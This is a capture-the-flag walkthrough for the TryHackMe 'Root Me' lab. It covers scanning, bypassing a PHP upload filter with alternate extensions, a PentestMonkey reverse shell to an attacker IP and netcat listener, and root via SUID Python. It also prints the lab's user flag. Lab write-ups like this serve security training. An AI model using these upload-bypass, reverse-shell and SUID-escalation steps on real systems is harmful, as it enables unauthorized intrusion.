# Root Me

## Reconnaissance

- Run a basic scan:

```bash
sudo nmap <ip-address>
```

- Key findings:
  - Open ports: `80`, `22`
  - Web server: Apache `2.4.29`

- Enumerate web directories:

```bash
gobuster dir -u http://<ip-address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- Hidden directories discovered:
  - `panel`
  - `uploads`

## Getting a Shell

- The `panel` directory is a file-upload page.
- The page allows files such as text, JPG, and PNG files.
- Download a PHP reverse shell from PentestMonkey:
  - `https://github.com/pentestmonkey/php-reverse-shell`
- Rename the shell to `prs.php`.
- Edit the shell with the attacker IP and listener port:
  - Attacker IP: `10.10.78.39`
  - Port: `8989`

### Upload Bypass Attempts

- Direct upload of a `.php` file was blocked.
- Rename the file:

```bash
mv prs.php prs.txt
```

- Intercept the upload request in Burp Suite.
- Change the `filename` value from `prs.txt` to `prs.php` and forward the packet.
- This was blocked.
- Change `Content-Type` from `text/plain` to `application/x-php`.
- This was also blocked.

### Extension Fuzzing

- Send the latest POST request to Burp Intruder.
- Mark the `.php` file extension as the payload position.
- Set the attack type to `Sniper`.
- Use a simple payload list:
  - `php3`
  - `php4`
  - `php5`
  - `phtml`
- Multiple extensions appeared to upload successfully.

### Reverse Shell

- Start a listener:

```bash
netcat -nlvp 8989
```

- Browse to the uploaded shells outside of Burp.
- The `prs.php5` file successfully triggered a reverse shell.

### User Flag Discovery

- Search likely directories for the TryHackMe flag pattern:

```bash
grep -r "THM{" /home/ /tmp/ /usr/ /var/ 2>/dev/null
```

- Result:
  - Flag: `THM{y0u_g0t_a_sh3ll}`
  - Location: `/var/www/user.txt`

## Privilege Escalation

### SUID Enumeration

- Find SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

- Interesting binary:
  - `/usr/bin/python`

### Python SUID Abuse

- GTFOBins identifies Python as exploitable when it has SUID permissions.
- Reference used:
  - `https://derek-toohey19.medium.com/tryhackme-rootme-walkthrough-d392ff9702ec`

- Example setup command from the reference:

```bash
sudo sh -c 'cp $(which python) .; chmod +s ./python'
```

- In this challenge, the SUID bit is already set on Python, so the copy step can be skipped.

- Execute a root shell through Python:

```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Why This Works

- The Python binary is owned by root and has the SUID bit set.
- When executed, it runs with the privileges of the file owner rather than the current user.
- Launching `/bin/sh` with `-p` preserves the elevated privileges.

### Root Flag Search

- Change to `/usr/bin` and run the Python command.
- After gaining root, search for the flag:

```bash
grep -r "THM{" /home/ /root/ /tmp/
```
